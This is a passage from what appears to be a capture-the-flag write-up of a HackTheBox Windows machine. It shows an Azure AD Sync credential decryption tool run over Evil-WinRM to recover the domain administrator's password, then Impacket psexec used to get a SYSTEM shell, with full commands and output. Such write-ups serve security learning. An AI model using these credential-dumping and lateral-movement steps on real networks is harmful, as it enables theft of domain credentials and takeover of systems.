Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Error reading from database: A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 52 - Unable to locate a Local Database Runtime installation. Verify that SQL Server Express is properly installed and that the Local Database Runtime feature is enabled.)
Closing database connection...
```

The article mentioned that if said error shows up the -FullSQL option should be able to fix it, and in fact now it works and some credentials are found:

```aaa
*Evil-WinRM* PS C:\program files\Microsoft Azure AD Sync\bin> c:\users\mhope\downloads\c.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

So we can add Administrator to the list of owned users:

```aaa
User: Administrator
Pass: d0m@in4dminyeah!
```

Which means we can use them to psexec into the box and obtain a SYSTEM shell:

```aaa
┌─[baud@parrot]─[~/HTB/monteverde]
└──╼ $/opt/impacket/examples/psexec.py administrator@10.10.10.172
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.172.....
[*] Found writable share ADMIN$
[*] Uploading file lihqDKSj.exe
[*] Opening SVCManager on 10.10.10.172.....
[*] Creating service ltxm on 10.10.10.172.....
[*] Starting service ltxm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.914]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```




























